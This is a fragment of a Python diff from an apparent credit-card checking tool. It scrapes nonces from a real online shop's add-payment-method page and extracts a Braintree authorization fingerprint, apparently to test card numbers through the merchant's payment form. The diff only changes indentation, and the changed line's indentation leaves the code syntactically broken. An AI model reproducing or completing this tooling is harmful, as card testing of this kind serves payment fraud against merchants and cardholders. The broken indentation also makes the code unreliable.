@@ -124,14 +124,14 @@ def check_nonsk4(ccx):
 
     response = r.get('https://forfullflavor.com/my-account/add-payment-method/', cookies=r.cookies, headers=headers)
     add_nonce = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', response.text).group(1)
-    client = re.search(r'client_token_nonce":"([^"]+)"', response.text).group(1)
+        client = re.search(r'client_token_nonce":"([^"]+)"', response.text).group(1)
 
     data = {
         'action': 'wc_braintree_credit_card_get_client_token',
         'nonce': client,
     }
 
-        response = r.post('https://forfullflavor.com/wp-admin/admin-ajax.php', cookies=r.cookies, headers=headers, data=data)
+    response = r.post('https://forfullflavor.com/wp-admin/admin-ajax.php', cookies=r.cookies, headers=headers, data=data)
     enc = response.json()['data']
     dec = base64.b64decode(enc).decode('utf-8')
     au = re.findall(r'"authorizationFingerprint":"(.*?)"', dec)[0]
